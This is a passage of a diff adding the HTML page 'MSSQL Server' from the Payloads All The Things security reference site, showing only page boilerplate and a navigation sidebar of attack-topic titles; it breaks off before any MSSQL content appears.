@@ -1,0 +1,4871 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.3">
+    
+    
+      
+        <title>MSSQL Server - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6b80c2a2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#mssql-server" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              MSSQL Server
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="API Key Leaks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS Amazon Bucket S3" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Account Takeover" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CORS Misconfiguration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CRLF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CRLF%20Injection/" class="md-nav__link">
+        CRLF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSRF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSV Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSV%20Injection/" class="md-nav__link">
+        CSV Injection (Formula Injection)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Exploits" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Command Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DNS Rebinding" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Dependency Confusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Directory Traversal" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Directory%20Traversal/" class="md-nav__link">
+        Directory traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="File Inclusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="GraphQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HTTP Parameter Pollution" data-md-level="1">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Deserialization" data-md-level="1">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Object injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
